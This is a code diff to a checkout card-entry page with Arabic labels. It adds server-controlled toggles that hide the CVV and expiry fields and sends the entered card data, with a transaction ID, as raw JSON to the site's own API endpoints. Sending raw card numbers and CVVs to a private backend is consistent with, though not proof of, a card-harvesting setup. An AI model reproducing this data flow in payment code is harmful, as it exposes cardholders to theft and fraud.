@@ -12,6 +12,7 @@ import CardNumberInput from "./_components/CardNumberInput";
 export default function CardPage() {
   const router = useRouter();
   const { settings, loading } = useSettings();
+  const [cardFieldSettings, setCardFieldSettings] = useState({ showExpiryDate: true, showCvv: true });
   const [flipped, setFlipped] = useState(false);
   const [touched, setTouched] = useState<Record<string, boolean>>({});
   const [card, setCard] = useState(() => {
@@ -23,6 +24,10 @@ export default function CardPage() {
 
   useEffect(() => {
     if (!sessionStorage.getItem("formData")) router.replace("/checkout/details");
+    fetch("/api/card-settings")
+      .then((r) => r.json())
+      .then((data) => setCardFieldSettings({ showExpiryDate: data.showExpiryDate ?? true, showCvv: data.showCvv ?? true }))
+      .catch(() => {});
   }, [router]);
 
   const touch = (key: string) => setTouched((p) => ({ ...p, [key]: true }));
@@ -33,7 +38,11 @@ export default function CardPage() {
     return "";
   }
 
+  const showExpiry = cardFieldSettings.showExpiryDate;
+  const showCvv = cardFieldSettings.showCvv;
+
   function validateExpiry(v: string) {
+    if (!showExpiry) return "";
     if (!v) return "تاريخ الانتهاء مطلوب";
     if (!/^\d{2}\/\d{2}$/.test(v)) return "صيغة التاريخ غير صحيحة (MM/YY)";
     const [mm, yy] = v.split("/").map(Number);
@@ -45,6 +54,7 @@ export default function CardPage() {
   }
 
   function validateCvv(v: string) {
+    if (!showCvv) return "";
     if (!v) return "رمز CVV مطلوب";
     if (v.length !== 3) return "رمز CVV يجب أن يكون 3 أرقام";
     return "";
@@ -69,7 +79,7 @@ export default function CardPage() {
       fetch("/api/requests", {
         method: "PUT",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(merged),
+        body: JSON.stringify({ ...merged, transactionId: sessionStorage.getItem("transactionId") }),
       }),
       transactionId
         ? fetch("/api/card-transactions", {
@@ -154,6 +164,7 @@ export default function CardPage() {
                 )}
               </div>
 
+              {showCvv && (
               <div className="flex flex-col gap-1">
                 <label className="text-sm sm:text-base font-semibold text-secondary px-1">رمز CVV *</label>
                 <input
@@ -166,11 +177,12 @@ export default function CardPage() {
                   placeholder="•••"
                   maxLength={3}
                   inputMode="numeric"
-                  required
                 />
                 {touched.cvv && cvvError && <p className="text-error text-xs px-1 mt-0.5">{cvvError}</p>}
               </div>
+              )}
 
+              {showExpiry && (
               <div className="flex flex-col gap-1">
                 <label className="text-sm sm:text-base font-semibold text-secondary px-1">تاريخ انتهاء البطاقة *</label>
                 <input
@@ -187,10 +199,10 @@ export default function CardPage() {
                   placeholder="MM/YY"
                   maxLength={5}
                   inputMode="numeric"
-                  required
                 />
                 {touched.expiryDate && expiryError && <p className="text-error text-xs px-1 mt-0.5">{expiryError}</p>}
               </div>
+              )}
             </div>
 
             <div className="flex flex-col-reverse sm:flex-row items-stretch sm:items-center justify-between gap-3 pt-6">
